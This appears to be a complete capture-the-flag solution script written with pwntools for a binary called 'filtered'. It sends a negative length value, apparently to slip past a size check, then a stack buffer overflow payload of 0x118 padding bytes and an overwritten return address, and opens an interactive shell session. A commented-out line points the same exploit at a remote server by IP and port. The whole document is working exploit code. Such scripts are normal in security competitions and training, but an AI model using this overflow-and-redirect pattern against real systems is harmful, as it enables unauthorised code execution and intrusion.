from pwn import *
p=process('./filtered')
#p=remote('167.99.78.201',9001)
#raw_input("DEBUG")
p.sendline("-100")
payload = "a"*0x118
payload += p64(0x4011d6)
p.sendline(payload)
p.interactive()